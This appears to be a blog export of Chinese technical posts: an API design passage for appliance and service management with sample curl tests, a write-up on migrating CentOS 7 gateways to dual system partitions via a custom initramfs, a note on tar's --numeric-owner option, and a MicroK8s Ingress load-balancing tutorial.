<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;data&quot;: [</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;targetVolume&quot;: &quot;data | image&quot;,</span><br><span class="line">			&quot;size&quot;: 400765</span><br><span class="line">		&#125;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Test</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; -H &quot;Content-Type:application/json&quot; -d &#x27;&#123;&quot;data&quot;: [&#123;&quot;targetVolume&quot;: &quot;data&quot;, &quot;size&quot;: 1024&#125;]&#125;&#x27; \</span><br><span class="line">&quot;https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/storage/&quot;</span><br></pre></td></tr></table></figure>

<h4><span id="get-appliance-metrics">Get Appliance Metrics</span></h4><p>POST &#x2F;ui&#x2F;appliances&#x2F;<appliance_id>&#x2F;metrics</appliance_id></p>
<h4><span id="collect-appliance-log">Collect Appliance Log</span></h4><p>POST &#x2F;ui&#x2F;appliances&#x2F;<appliance_id>&#x2F;log</appliance_id></p>
<p><strong>Procedure</strong></p>
<ul>
<li>parse customer_id in request header, check DB if customer is valid.</li>
<li>get upload url(aws s3), 支持收某段时间的LOG(7天，2周，1个月)</li>
<li>notify VA to collect logs</li>
<li>wait log collected (30 minutes)</li>
<li>resp download link</li>
</ul>
<p><strong>Request</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;downloadLink&quot;: &quot;url&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Test</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; -H &quot;Content-Type:application/json&quot; \</span><br><span class="line">&quot;https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/log/&quot;</span><br></pre></td></tr></table></figure>

<p><font color="red"><strong>Service Management</strong></font></p>
<h4><span id="list-service">List Service</span></h4><p>GET &#x2F;ui&#x2F;appliances&#x2F;<appliance_id>&#x2F;services</appliance_id></p>
<p><strong>Procedure</strong></p>
<ul>
<li>parse customer_id in request header, check if customer is valid, va belongs to this customer.</li>
<li>query applianceServiceSettings DB table, find all services of this appliance. </li>
<li>response a list of services to frontend.</li>
</ul>
<p><strong>Response</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;data&quot;: [</span><br><span class="line">		&#123;</span><br><span class="line">			&quot;serviceCode&quot;: &quot;va-squid&quot;,</span><br><span class="line">			&quot;version&quot;: &quot;1.0.0.10000&quot;,</span><br><span class="line">			&quot;displayVersion&quot;: &quot;1.0.0&quot;,</span><br><span class="line">			&quot;latestVersion&quot;: &quot;A.B.C.DDDDD&quot;,		# latest avaliable service version </span><br><span class="line">			&quot;latestDisplayVersion&quot;: &quot;A.B.C&quot;,</span><br><span class="line">			&quot;status&quot;: &quot;uninstalled | installing | running | disabled&quot;,</span><br><span class="line">			&quot;healthStatus&quot;: &quot;healthy | unhealthy&quot;,</span><br><span class="line">			&quot;requestCPU&quot;: 1</span><br><span class="line">			&quot;requestMemory&quot;: 1024 </span><br><span class="line">		&#125;</span><br><span class="line">	]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Test</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; \</span><br><span class="line">&quot;https://peter.backend.com/ui/appliances/974bf535-7930-474e-8da6-780cafff284d/services/&quot;</span><br></pre></td></tr></table></figure>

<h4><span id="installx2funinstallx2fupgrade-service">Install&#x2F;Uninstall&#x2F;Upgrade Service</span></h4><p>POST &#x2F;ui&#x2F;services&#x2F;<service_code>&#x2F;install</service_code></p>
<h5><span id="install-service">Install Service</span></h5><p><strong>Procedure</strong></p>
<ul>
<li>parse customer_id in request header, check DB if customer is valid.</li>
<li>find latest service version</li>
<li>if service already installed, return OK, else: <ul>
<li>check if reach resources limit</li>
<li>get service package download url</li>
<li>create or update related dbentry, change expected status to running	</li>
<li>notify VA</li>
</ul>
</li>
<li>resp 200 OK</li>
</ul>
<p><strong>Install Service Request</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;applianceId&quot;: &quot;974bf535-7930-474e-8da6-780cafff284d&quot;,</span><br><span class="line">	&quot;action&quot;: &quot;install | uninstall | upgrade&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>IOT Command</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;serviceCode&quot;: &quot;serviceCode&quot;,</span><br><span class="line">    &quot;taskType&quot;: &quot;installService&quot;</span><br><span class="line">    &quot;targetVersion&quot;: latest_version.version,</span><br><span class="line">    &quot;branch&quot;: latest_version.branch,</span><br><span class="line">    &quot;imagePath&quot;: download_url,</span><br><span class="line">    &quot;imageSha256&quot;: latest_version.package_sha256</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Test</strong><br>install service</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into app_serviceinfo(service_code, created_at, updated_at, default_setting) values(&#x27;va-squid&#x27;, now(), now(), &#x27;&#123;&#125;&#x27;); </span><br><span class="line">insert into app_serviceversion(service_code, version, display_version, package_path, package_sha256, request_cpu, request_memory, disable, created_at, updated_at, branch, appliance_dependency, package_size) values \</span><br><span class="line">(&#x27;va-squid&#x27;, &#x27;1.0.0.10000&#x27;, &#x27;1.0.0&#x27;, &#x27;https://va-squid.tar.gz&#x27;, &#x27;125a100301e72f3fe3a59cdab01a563ca239c7ea2728b4f39a44a3b6064d4286&#x27;, 1, 1024*1024, 0, now(), now(), &#x27;main&#x27;, &#x27;&#x27;, 0);</span><br><span class="line"></span><br><span class="line">curl -X POST -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; -d &#x27;&#123;&quot;applianceId&quot;: &quot;974bf535-7930-474e-8da6-780cafff284d&quot;, &quot;action&quot;: &quot;install&quot;&#125;&#x27; -H &quot;Content-Type:application/json&quot;  \</span><br><span class="line">&quot;https://peter.backend.com/ui/services/va-squid/install/&quot;</span><br></pre></td></tr></table></figure>
<p>uninstall service</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; -d &#x27;&#123;&quot;applianceId&quot;: &quot;974bf535-7930-474e-8da6-780cafff284d&quot;, &quot;action&quot;: &quot;uninstall&quot;&#125;&#x27; -H &quot;Content-Type:application/json&quot;  \</span><br><span class="line">&quot;https://peter.backend.com/ui/services/va-squid/install/&quot;</span><br></pre></td></tr></table></figure>


<h4><span id="enablex2fdisable-service">Enable&#x2F;Disable Service</span></h4><p>POST &#x2F;ui&#x2F;services&#x2F;<service_code>&#x2F;<appliance_id>&#x2F;toggle</appliance_id></service_code></p>
<p><strong>Procedure</strong></p>
<ul>
<li>parse customer_id from header, parse appliance_id, service_code from uri</li>
<li>query service settings from DB</li>
<li>change service status</li>
<li>notify to VA</li>
</ul>
<p><strong>Request</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;action&quot;: &quot;enable | disable&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Response</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;message&quot;: &quot;success&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Test</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; -d &#x27;&#123;&quot;action&quot;: &quot;enable&quot;&#125;&#x27; -H &quot;Content-Type:application/json&quot;  \</span><br><span class="line">&quot;https://peter.backend.com/ui/services/va-squid/974bf535-7930-474e-8da6-780cafff284d/toggle/&quot;</span><br></pre></td></tr></table></figure>


<h4><span id="get-service-settings">Get Service Settings</span></h4><p>GET &#x2F;ui&#x2F;services&#x2F;<service_code>&#x2F;<appliance_id>&#x2F;settings</appliance_id></service_code></p>
<p><strong>Procedure</strong></p>
<ul>
<li>query service settings from DB based on appliance_id, service_code</li>
<li>response to frontend</li>
</ul>
<p><strong>Response</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;settings&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>TEST</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; &quot;https://peter.backend.com/ui/services/va-squid/974bf535-7930-474e-8da6-780cafff284d/settings/&quot;</span><br></pre></td></tr></table></figure>

<h4><span id="configure-service-settings">Configure Service Settings</span></h4><p>POST &#x2F;ui&#x2F;services&#x2F;<service_code>&#x2F;<appliance_id>&#x2F;settings</appliance_id></service_code></p>
<p><strong>Procedure</strong></p>
<ul>
<li>parse settings from req body</li>
<li>parse appliance_id, service_code from uri</li>
<li>query current service settings from DB</li>
<li>notify VA to configure service</li>
</ul>
<p><strong>Test</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -X POST -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; -H &quot;Content-Type:application/json&quot; -d &#x27;&#123;&quot;setting&quot;: &#123;&quot;settings101&quot;: &quot;value101&quot;&#125;, &quot;setting_version&quot;: 101&#125;&#x27; \</span><br><span class="line">&quot;https://peter.backend.com/ui/services/va-squid/974bf535-7930-474e-8da6-780cafff284d/settings/&quot;</span><br></pre></td></tr></table></figure>

<h4><span id="query-task-result">Query Task result</span></h4><p>GET &#x2F;ui&#x2F;tasks&#x2F;<task_id></task_id></p>
<p><strong>Procedure</strong></p>
<ul>
<li>parse customer_id from header, parse appliance_id, task_id from uri</li>
<li>query task result from DB</li>
<li>resp task result</li>
</ul>
<p><strong>Response</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;delivered&quot;: False, # if received from va, return True.</span><br><span class="line">	&quot;status&quot;: task.status,</span><br><span class="line">	&quot;result&quot;: task.result,</span><br><span class="line">	&quot;error_message&quot;: task.error_message</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Test</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -H &quot;x-customer-id: 77a1c956-1c8d-47fb-8036-c970a4f2ee73&quot; \</span><br><span class="line">&quot;https://peter.backend.com/ui/tasks/0c5b000b68ad4d3faedded836e92f24b/&quot;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title>通过定制initramfs实现从单系统分区到双系统的无缝迁移</title>
    <url>/2025/0301162419.html</url>
    <content><![CDATA[<h1><span id="背景">背景</span></h1><p>我们的客户有一些本地部署的网关设备(CentOS 7)需要做固件升级。 原有的单系统分区架构缺乏有效的回滚机制, 升级遇到故障后无法回滚, 导致服务中断, 用户体验差</p>
<h1><span id="目标">目标</span></h1><p>设计一种解决方案, 自动将客户的网关设备从单系统分区平滑升级到双系统，同时保证用户配置(IP, DNS, 登录口令)不丢失<br>整个升级过程对客户完全透明, 无需客户进行额外操作(比如添加磁盘, 创建新机器)</p>
<h1><span id="方案">方案</span></h1><p>设计如下方案:</p>
<table>
<thead>
<tr>
<th>方案</th>
<th>描述</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>定制initramfs</td>
<td>通过定制initramfs进入紧急模式，预先加载升级包和配置文件到内存，再重建磁盘分区</td>
<td>用户无感知, 且备份了旧的配置</td>
<td>内存空间有限, 升级包+解压后系统文件需小于内存</td>
</tr>
<tr>
<td>安装ISO</td>
<td>下载并安装目标系统ISO</td>
<td>不需要单独出一个升级包</td>
<td>客户的配置很难同步, 升级后需要用户做一些手动配置</td>
</tr>
</tbody></table>
<span id="more"></span>

<p>最终采用定制initramfs方案。 客户虚拟机内存最低配置是8G, 需保证initramfs阶段的升级包+解压后系统文件小于8G</p>
<p>测试结果: c7最小化镜像900M, 安装后磁盘占用1.3G; 安装Microk8s后磁盘占用3G左右, 升级包1.7G, initramfs用掉4G内存, 远小于8G, 可行</p>
<h1><span id="实现">实现</span></h1><p><img data-src="/2025/0301162419/image1.png"></p>
<p><strong>目标系统分区设计</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># lsblk</span><br><span class="line">NAME         MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">sda            8:0    0   10G  0 disk</span><br><span class="line">├─sda1         8:1    0    2M  0 part</span><br><span class="line">├─sda2         8:2    0    1G  0 part /boot</span><br><span class="line">└─sda3         8:3    0  8.8G  0 part</span><br><span class="line">  ├─VA-root  253:0    0  7.8G  0 lvm  /</span><br><span class="line">  ├─VA-image 253:1    0  512M  0 lvm  /image</span><br><span class="line">  └─VA-data  253:2    0  512M  0 lvm  /data</span><br></pre></td></tr></table></figure>

<p><strong>升级包设计</strong></p>
<table>
<thead>
<tr>
<th>内容</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>目标系统的分区表文件(sgdisk)</td>
<td>使用sgdisk导出的新系统的分区表文件，支持双系统启动</td>
</tr>
<tr>
<td>目标系统文件的压缩包(.tar.xz)</td>
<td>把虚拟机导出到OVA，再把VMDK根文件系统中所有文件备份成压缩包</td>
</tr>
<tr>
<td>initramfs-convert.img</td>
<td>基于官方ISO的initramfs定制</td>
</tr>
<tr>
<td>vmlinuz-convert</td>
<td>一个压缩内核, 直接从官方ISO取</td>
</tr>
<tr>
<td>upgrade.sh</td>
<td>二阶段执行, 一阶段在客户机上执行, 下载升级包, 进入紧急模式; 二阶段在initramfs执行, 完成分区重建, 安装和启动目标系统</td>
</tr>
</tbody></table>
<p>实现细节:</p>
<ul>
<li>分区方案采用BIOS&#x2F;GPT, BIOS是为了兼容老客户, GPT可以支持2T以上磁盘, 可扩展性和性能更好</li>
<li>tar备份目标系统时, 需要<code>--numeric-owner</code>保留文件的UID&#x2F;GID, 以及文件扩展属性xattr(有snap的应用运行状态）</li>
</ul>
<p>代码参考: <a href="https://github.com/PCJ600/os_migrate">https://github.com/PCJ600/os_migrate</a></p>
<h1><span id="难点">难点</span></h1><p>initramfs空间有限, 需要尽可能压缩升级包</p>
<ul>
<li>使用CentOS 7官方的minimal ISO做镜像(900M)</li>
<li>只分配必要磁盘空间, 等客户升级成功后动态分配剩余空间, 使升级包尽可能做小</li>
<li>导出OVA前, 清理临时文件，日志文件, 禁用交换分区</li>
<li>使用压缩比率高的压缩算法(xz)</li>
</ul>
<h1><span id="调试方法">调试方法</span></h1><ol>
<li>手动进入GRUB rescue模式加载内核, 手动挂载磁盘根分区，查看失败日志<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set root=(hd0,gpt2)</span><br><span class="line">linux (hd0,gpt2)/vmlinuz-convert root=/dev/mapper/VA-root ro rd.lvm.lv=VA/root</span><br><span class="line">initrd (hd0,gpt2)/initramfs-convert.img</span><br></pre></td></tr></table></figure></li>
<li>先对虚拟机做快照, 如果调试失败通过快照迅速恢复系统</li>
</ol>
<h1><span id="调试问题">调试问题</span></h1><p>Q: 切换到新系统后, 输入正确的用户名和密码也无法登录, console一直打印localhost login<br>A: 通过手动进入GRUB rescue模式调试, 挂载磁盘日志发现是SELinux的问题, 将目标系统的SELinux设置为disabled后，问题得到解决</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title>使用tar备份Linux系统时需要添加--numeric-owner参数</title>
    <url>/2025/0302142701.html</url>
    <content><![CDATA[<h2><span id="前言">前言</span></h2><p>在Linux双系统升级过程中, 需要先备份新系统的所有文件得到升级包, 然后在需要升级的机器上解压升级包, 完成升级. tar是Linux系统最常用的备份工具之一。<br>然而, 在这种跨系统的备份和迁移中, 如果没有正确地处理文件所有者信息, 就会导致权限混乱, 升级后出现一些严重问题, 例如用户无法登录。</p>
<p>我在实际项目中遇到了这个问题。 以下说明为什么使用tar备份Linux系统时需要添加<code>--numeric-owner</code>参数</p>
<h2><span id="tar的-numeric-owner参数是什么">tar的<code>--numeric-owner</code>参数是什么</span></h2><p><code>--numeric-owner</code>是tar的一个选项, 用于在打包或解包时, 保留文件的UID和GID, 而不是直接映射当前系统的用户名称和组名称</p>
<h2><span id="为什么需要-numeric-owner参数">为什么需要<code>--numeric-owner</code>参数</span></h2><p>因为在跨系统迁移时，源系统和目标系统的用户配置可能是不一致的，例如：</p>
<ul>
<li>目标系统有一个用户alice(UID&#x3D;1002), 源系统虽然也有用户alice, 但UID&#x3D;1000</li>
<li>这种情况很常见, 比如说目标系统和原系统的OS不一致, 或者在目标系统上新增了一些用户, 造成这种不一致</li>
<li>如果备份时没有使用<code>--numeric-owner</code>, 源系统解压了tar包后得到的文件UID是1000; 升级到目标系统后, alice(UID&#x3D;1002)并不是UID&#x3D;1000的文件所有者, 就会出现权限错误的问题</li>
</ul>
<h2><span id="演示案例">演示案例</span></h2><p>以下通过演示, 说明备份系统时忽略<code>--numeric-owner</code>时存在的问题</p>
<span id="more"></span>

<p>假设有两个Linux系统:</p>
<ul>
<li>源系统 A: 有一个alice用户(UID&#x3D;1000)</li>
<li>目标系统 B: 有一个alice用户(UID&#x3D;1002)</li>
</ul>
<p>1、在目标系统上创建文件并压缩</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># echo &quot;hello&quot; &gt; example.txt</span><br><span class="line"># chown alice:alice example.txt</span><br><span class="line"># ls -l example.txt</span><br><span class="line">-rw-r--r--. 1 alice alice 6 Mar  2 15:03 example.txt</span><br><span class="line"># ls -l --numeric example.txt</span><br><span class="line">-rw-r--r--. 1 1002 1002 6 Mar  2 15:03 example.txt </span><br><span class="line"></span><br><span class="line">tar -zcvf example.tar.gz example.txt</span><br></pre></td></tr></table></figure>

<p>2、把压缩包传到源系统上</p>
<p>3、在源系统上解压文件(未使用–numeric-owner)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ls -alh example.txt</span><br><span class="line">-rw-r--r--. 1 alice alice 6 Mar  2 02:03 example.txt</span><br><span class="line"># ls -n example.txt</span><br><span class="line">-rw-r--r--. 1 1000 1000 6 Mar  2 02:03 example.txt</span><br></pre></td></tr></table></figure>
<p>可以看到, 解压后的文件UID被错误地改成1000, 这样升级到目标系统会有权限问题 </p>
<p>4、在源系统上解压文件(使用–numeric-owner)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># tar --numeric-owner -xzvf example.tar.gz</span><br><span class="line"># ls -alh example.txt</span><br><span class="line">-rw-r--r--. 1 1002 1002 6 Mar  2 02:03 example.txt</span><br><span class="line"># ls -n example.txt</span><br><span class="line">-rw-r--r--. 1 1002 1002 6 Mar  2 02:03 example.txt</span><br></pre></td></tr></table></figure>
<p>现在, 文件UID&#x3D;1002被正确保留, 升级到目标系统后不会出现权限问题</p>
<h2><span id="参考">参考</span></h2><p><a href="https://help.ubuntu.com/community/BackupYourSystem/TAR">https://help.ubuntu.com/community/BackupYourSystem/TAR</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Microk8s Ingress实现七层负载均衡</title>
    <url>/2025/0303201100.html</url>
    <content><![CDATA[<h1><span id="microk8s-ingress是什么">Microk8s Ingress是什么</span></h1><p>Ingress是k8s的一种资源对象，用于管理外部对集群内服务的访问, 它通过提供一个统一的入口点，将外部流量路由到集群内部的不同服务。</p>
<h1><span id="microk8s-ingress用于解决什么问题">Microk8s Ingress用于解决什么问题</span></h1><p>k8s集群中服务默认只能在集群内访问。 如果需要从外部访问服务，通常需要使用NodePort或LoadBalancer类型服务，这两个服务都存在一些问题</p>
<ul>
<li>NodePort会占用节点端口，可能导致端口冲突</li>
<li>LoadBalancer需要云提供商支持, 不适合本地环境</li>
<li>Ingress提供一种灵活的方式暴露服务，允许通过域名或路径规则将流量路由到不同的服务</li>
</ul>
<h1><span id="microk8s-ingress基本原理">Microk8s Ingress基本原理</span></h1><ul>
<li>Microk8s内置了一个Nginx的Ingress Controller, 负责监听k8s中的Ingress资源，当检测到Ingress资源更新时, 动态更新Nginx配置文件</li>
<li>外部流量先到达Nginx, 再基于域名和URL将请求转发到Service, Service再将流量分发到Pod</li>
</ul>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl -n ingress get pod nginx-ingress-microk8s-controller-nrftt</span><br><span class="line">NAME                                      READY   STATUS    RESTARTS   AGE</span><br><span class="line">nginx-ingress-microk8s-controller-nrftt   1/1     Running   0          15m</span><br><span class="line"></span><br><span class="line"># ps axf </span><br><span class="line"> 860646 ?        Sl     0:00 /var/lib/snapd/snap/microk8s/7665/bin/containerd-shim-runc-v2 -namespace k8s.io -id 8fb71f54235bf26664240c8b9272b623a70d</span><br><span class="line"> 860668 ?        Ss     0:00  \_ /pause</span><br><span class="line"> 860700 ?        Ss     0:00  \_ /usr/bin/dumb-init -- /nginx-ingress-controller --configmap=ingress/nginx-load-balancer-microk8s-conf --tcp-services-configmap=ingress/nginx-ingress-tcp-microk8s-conf --udp-services-configmap=ingress/nginx-ingress-udp-microk8s-conf --ingress-class=public   --publish-status-address=127.0.0.1 --default-ssl-certificate=default/example-tls</span><br><span class="line"> 860712 ?        Ssl    0:00      \_ /nginx-ingress-controller --configmap=ingress/nginx-load-balancer-microk8s-conf --tcp-services-configmap=ingress/nginx-ingress-tcp-microk8s-conf --udp-services-configmap=ingress/nginx-ingress-udp-microk8s-conf --ingress-class=public   --publish-status-address=127.0.0.1 --default-ssl-certificate=default/example-tls</span><br><span class="line"> 860782 ?        S      0:00          \_ nginx: master process /usr/bin/nginx -c /etc/nginx/nginx.conf</span><br><span class="line"> 860786 ?        Sl     0:00              \_ nginx: worker process</span><br><span class="line"> 860787 ?        Sl     0:00              \_ nginx: worker process</span><br><span class="line"> 860788 ?        Sl     0:00              \_ nginx: worker process</span><br><span class="line"> 860789 ?        Sl     0:00              \_ nginx: worker process</span><br><span class="line"> 860790 ?        S      0:00              \_ nginx: cache manager process</span><br></pre></td></tr></table></figure>

<h1><span id="实践-使用microk8s-ingress配置httpx2ftcp负载均衡">实践: 使用Microk8s Ingress配置HTTP&#x2F;TCP负载均衡</span></h1><p>首先安装并启动Microk8s和Ingress插件, 参考: <a href="https://blog.csdn.net/pcj_888/article/details/144169716">在RockyLinux9.4上安装Microk8s</a><br>演示案例如下图:<br><img data-src="/2025/0303201100/image1.png"></p>
<h2><span id="支持http负载均衡">支持HTTP负载均衡</span></h2><p>用Flask写两个简单的HTTP服务</p>
<p>app.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/foo/&#x27;)</span><br><span class="line">def hello_world():</span><br><span class="line">    return &quot;Hello, foo!&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=8080)</span><br></pre></td></tr></table></figure>

<p>Dockerfile</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM python:3.9-slim</span><br><span class="line">WORKDIR /app</span><br><span class="line">COPY . /app</span><br><span class="line">RUN pip install flask</span><br><span class="line">EXPOSE 8080</span><br><span class="line">CMD [&quot;python&quot;, &quot;app.py&quot;]</span><br></pre></td></tr></table></figure>

<p>构建docker镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker build -t foo:1.0 -f Dockerfile .</span><br><span class="line">docker save foo:1.0 &gt; foo.tar</span><br></pre></td></tr></table></figure>

<p>创建k8s资源, 创建Deployment</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: foo-deployment</span><br><span class="line">spec:</span><br><span class="line">  replicas: 1</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: foo</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: foo</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: foo</span><br><span class="line">        image: foo:1.0</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br></pre></td></tr></table></figure>

<p>创建Service</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: foo-service</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    app: foo</span><br><span class="line">  ports:</span><br><span class="line">    - protocol: TCP</span><br><span class="line">      port: 80</span><br><span class="line">      targetPort: 8080</span><br><span class="line">  type: ClusterIP</span><br></pre></td></tr></table></figure>

<p>在Microk8s环境上导入镜像, 创建yaml, 先在集群内部测试一下服务OK</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">microk8s.ctr image *.tar</span><br><span class="line">kubectl create -f *.yaml</span><br><span class="line"></span><br><span class="line"># kubectl get svc</span><br><span class="line">default       bar-service   ClusterIP   10.152.183.208   &lt;none&gt;        80/TCP                   11s</span><br><span class="line">default       foo-service   ClusterIP   10.152.183.189   &lt;none&gt;        80/TCP                   25m</span><br><span class="line"># curl 10.152.183.189:80/foo/</span><br><span class="line">Hello Foo!</span><br><span class="line"># curl 10.152.183.208/bar/</span><br><span class="line">Hello Bar!</span><br></pre></td></tr></table></figure>

<p><strong>配置Ingress, 支持集群外访问</strong><br>默认情况下, Ingress Controller是通过NodePort类型暴露的, 这里我们改成监听宿主机的80端口, 通过修改Ingress的DaemonSet实现:<br>创建nginx-ingress-microk8s-controller-patch.yaml</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: DaemonSet</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-ingress-microk8s-controller</span><br><span class="line">  namespace: ingress</span><br><span class="line">spec:</span><br><span class="line">  template:</span><br><span class="line">    spec:</span><br><span class="line">      hostNetwork: true</span><br><span class="line">      containers:</span><br><span class="line">      - name: nginx-ingress-microk8s</span><br><span class="line">        args:</span><br><span class="line">        # must list all others here?</span><br><span class="line">        - /nginx-ingress-controller</span><br><span class="line">        - --configmap=$(POD_NAMESPACE)/nginx-load-balancer-microk8s-conf</span><br><span class="line">        - --tcp-services-configmap=$(POD_NAMESPACE)/nginx-ingress-tcp-microk8s-conf</span><br><span class="line">        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-ingress-udp-microk8s-conf</span><br><span class="line">        - --ingress-class=public</span><br><span class="line">        - &#x27; &#x27;</span><br><span class="line">        - --publish-status-address=127.0.0.1</span><br></pre></td></tr></table></figure>
<p>修改Ingress的DaemonSet</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl -n ingress patch ds nginx-ingress-microk8s-controller --patch-file nginx-ingress-microk8s-controller-patch.yaml</span><br></pre></td></tr></table></figure>
<p>确认宿主机80端口已经LISTEN</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ss -antp | grep &quot;:*80&quot;</span><br><span class="line">LISTEN    0      4096                  0.0.0.0:80                   0.0.0.0:*     users:((&quot;nginx&quot;,pid=741444,fd=17),(&quot;nginx&quot;,pid=741437,fd=17))</span><br></pre></td></tr></table></figure>

<p>创建Ingress资源, 支持从集群外访问两个HTTP服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: networking.k8s.io/v1</span><br><span class="line">kind: Ingress</span><br><span class="line">metadata:</span><br><span class="line">  name: example-ingress</span><br><span class="line">spec:</span><br><span class="line">  rules:</span><br><span class="line">  - host: foo.example.com</span><br><span class="line">    http:</span><br><span class="line">      paths:</span><br><span class="line">      - path: /foo/</span><br><span class="line">        pathType: Prefix</span><br><span class="line">        backend:</span><br><span class="line">          service:</span><br><span class="line">            name: foo-service</span><br><span class="line">            port:</span><br><span class="line">              number: 80</span><br><span class="line">  - host: bar.example.com</span><br><span class="line">    http:</span><br><span class="line">      paths:</span><br><span class="line">      - path: /bar/</span><br><span class="line">        pathType: Prefix</span><br><span class="line">        backend:</span><br><span class="line">          service:</span><br><span class="line">            name: bar-service</span><br><span class="line">            port:</span><br><span class="line">              number: 80</span><br></pre></td></tr></table></figure>

<p>测试, 从集群外部访问成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl foo.example.com/foo/</span><br><span class="line">Hello Foo!</span><br><span class="line">curl bar.example.com/bar/</span><br><span class="line">Hello Bar!</span><br></pre></td></tr></table></figure>

